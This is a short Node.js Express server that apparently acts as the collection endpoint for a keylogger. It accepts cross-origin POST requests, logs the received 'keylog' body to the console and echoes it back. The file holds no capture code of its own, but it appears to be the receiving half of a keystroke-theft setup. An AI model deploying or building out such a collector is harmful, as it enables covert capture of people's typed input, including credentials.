import e from "express";
import CORS from "cors";

let app = e();

app.use(CORS());
app.use(e.json());
app.post("/", (req, res) => {
  let keylog = req.body;
  console.log(keylog);
  res.json({ keylog });
});

app.listen(3000, "0.0.0.0", () => {
  console.log("Server is running in http://localhost:3000");
});
